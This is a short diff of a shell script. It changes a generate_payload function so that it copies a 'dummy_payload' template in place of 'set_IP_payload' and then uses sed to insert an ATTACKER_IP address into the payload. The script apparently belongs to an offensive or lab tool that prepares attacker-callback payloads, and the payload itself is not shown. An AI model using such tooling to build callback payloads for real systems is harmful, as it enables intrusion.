@@ -26,7 +26,7 @@ append_after_file() {
 }
 
 generate_payload() {
-    cp ./set_IP_payload ./payload
+    cp ./dummy_payload ./payload
     sed -i "s/SER_IP/${ATTACKER_IP}/g" ./payload
 }
 
